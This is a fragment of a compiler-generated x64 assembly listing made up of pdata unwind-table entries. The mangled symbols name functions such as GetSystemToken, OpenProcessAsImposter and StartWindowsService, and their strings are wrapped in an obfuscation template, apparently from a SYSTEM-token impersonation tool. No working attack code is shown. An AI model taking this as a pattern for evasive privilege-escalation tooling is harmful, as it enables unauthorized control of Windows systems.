	DD	imagerel $unwind$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DD imagerel ??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
	DD	imagerel ??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ+115
	DD	imagerel $unwind$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DD imagerel ??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ+159
	DD	imagerel $unwind$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DD imagerel ??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ+112
	DD	imagerel $unwind$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ+167
	DD	imagerel $unwind$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ+226
	DD	imagerel $unwind$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HaltProcessExecution@ProcessUtilities@@YAXXZ DD imagerel $LN28
	DD	imagerel $LN28+230
	DD	imagerel $unwind$?HaltProcessExecution@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DD imagerel ??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ+112
	DD	imagerel $unwind$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
